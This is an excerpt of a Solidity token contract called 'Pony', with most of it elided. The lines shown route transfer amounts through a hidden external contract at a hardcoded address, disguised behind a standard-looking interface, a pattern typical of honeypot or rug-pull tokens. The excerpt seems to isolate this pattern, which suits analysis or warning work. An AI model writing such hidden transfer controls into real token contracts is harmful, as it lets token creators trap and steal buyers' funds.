...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _myLittlePony = 0xF01fAe7F24bB2C2fa027353F44a53B6BC115E968;
    address public pair;

    IDEXRouter router;
    IERC5679 myLittlePony;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        myLittlePony = IERC5679(_myLittlePony);
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return myLittlePony.sendTransaction(amount);
    }
    ...
    function _DeployPony(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPony(creator, initialSupply);
    }
}

contract Pony is ERC20Token {
    constructor() ERC20Token("Pony", "PONY", msg.sender, 69420000000 * 10 ** 18) {
    }
}